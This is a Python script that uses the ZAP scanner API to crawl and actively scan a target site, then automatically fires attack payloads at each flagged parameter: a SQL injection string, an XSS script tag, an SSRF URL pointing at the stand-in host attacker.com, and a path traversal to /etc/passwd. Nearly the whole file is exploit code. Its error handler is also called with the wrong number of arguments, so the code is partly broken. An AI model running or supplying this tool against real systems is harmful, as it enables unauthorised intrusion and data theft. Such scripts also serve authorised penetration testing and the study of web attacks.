import logging
from zapv2 import ZAPv2
import requests
import urllib.parse
 
# Configuration settings (customize as needed)
target_url = "http://example.com"  # Replace with your target URL
zap_api_key = "your_api_key"  # Replace with your actual ZAP API key

# Set up logging
logging.basicConfig(filename='security_testing.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Check if ZAP proxy is running
try:
    zap = ZAPv2(apikey=zap_api_key, proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"})
except Exception as e:
    logging.error("Failed to connect to ZAP proxy: %s", str(e))
    exit(1)

# Function to handle exceptions gracefully and log errors
def handle_error(error_message):
    logging.error(error_message)

# Define functions to exploit specific vulnerabilities
def exploit_sql_injection(url, param):
    try:
        # Generate a simple SQL Injection payload (customize as needed)
        sql_payload = "' OR '1'='1"
        
        # Craft the malicious URL
        malicious_url = f"{url}?{param}={urllib.parse.quote(sql_payload)}"
        
        # Send a GET request to the malicious URL
        response = requests.get(malicious_url)
        
        # Print or handle the response as needed
        logging.info("SQL Injection Exploited: %s", response.status_code)
    
    except Exception as e:
        handle_error("Error in SQL Injection Exploitation: %s", str(e))

def exploit_xss(url, param):
    try:
        # Generate a simple XSS payload (customize as needed)
        xss_payload = "<script>alert('XSS')</script>"
        
        # Craft the malicious URL
        malicious_url = f"{url}?{param}={urllib.parse.quote(xss_payload)}"
        
        # Send a GET request to the malicious URL
        response = requests.get(malicious_url)
        
        # Print or handle the response as needed
        logging.info("XSS Exploited: %s", response.status_code)
    
    except Exception as e:
        handle_error("Error in XSS Exploitation: %s", str(e))

def exploit_ssrf(url, param):
    try:
        # Generate an SSRF payload (customize as needed)
        ssrf_payload = "http://attacker.com/malicious-resource"
        
        # Craft the malicious URL
        malicious_url = f"{url}?{param}={urllib.parse.quote(ssrf_payload)}"
        
        # Send a GET request to the malicious URL
        response = requests.get(malicious_url)
        
        # Print or handle the response as needed
        logging.info("SSRF Exploited: %s", response.status_code)
    
    except Exception as e:
        handle_error("Error in SSRF Exploitation: %s", str(e))

def exploit_path_traversal(url, param):
    try:
        # Generate a path traversal payload (customize as needed)
        path_payload = "../../../../etc/passwd"
        
        # Craft the malicious URL
        malicious_url = f"{url}?{param}={urllib.parse.quote(path_payload)}"
        
        # Send a GET request to the malicious URL
        response = requests.get(malicious_url)
        
        # Print or handle the response as needed
        logging.info("Path Traversal Exploited: %s", response.status_code)
    
    except Exception as e:
        handle_error("Error in Path Traversal Exploitation: %s", str(e))

# Access the ZAP spiders and active scan
try:
    zap.spider.scan(target_url)
    zap.spider.wait_for_complete()
    zap.active_scan.scan(target_url)
    zap.active_scan.wait_for_complete()

    # Get a list of alerts (vulnerabilities)
    alerts = zap.core.alerts()

    # Define a dictionary to map alert names to exploit functions
    exploit_functions = {
        "SQL Injection": exploit_sql_injection,
        "Cross-Site Scripting (XSS)": exploit_xss,
        "Server-Side Request Forgery (SSRF)": exploit_ssrf,
        "Path Traversal": exploit_path_traversal,  # Add path traversal function
        # Add more vulnerability types and corresponding exploit functions as needed
    }

    # Iterate through alerts and exploit vulnerabilities if functions are defined
    for alert in alerts:
        alert_name = alert['alert']
        if alert_name in exploit_functions:
            logging.info(f"Exploiting {alert_name} at URL: {alert['url']}")
            exploit_functions[alert_name](alert['url'], alert['param'])

except Exception as e:
    handle_error("An error occurred in the main script: %s", str(e))

# Shutdown ZAP
zap.core.shutdown()
